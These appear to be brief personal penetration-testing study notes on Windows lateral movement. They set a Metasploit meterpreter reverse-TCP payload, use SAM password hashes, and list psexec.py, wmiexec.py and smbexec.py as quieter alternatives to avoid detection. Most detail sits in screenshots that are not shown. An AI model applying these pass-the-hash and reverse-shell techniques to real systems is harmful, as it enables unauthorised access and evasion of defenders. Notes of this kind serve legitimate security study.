Change the payload to windows/x64/meterpreter/reverse_tcp, to attack 64 bit machines
using `set payload windows/x64/meterpreter/reverse_tcp`
![[Pasted image 20250709184108.png]]

Using SAM Hashes
![[Pasted image 20250709184132.png]]

Metasploit is noisy so, this may get picked up, so we something else
Like psexec.py
![[Pasted image 20250709184409.png]]

Using Hashes
![[Pasted image 20250709184506.png]]

If psexec.py doesn't work, then use
`wmiexec.py`
or
`smbexec.py`

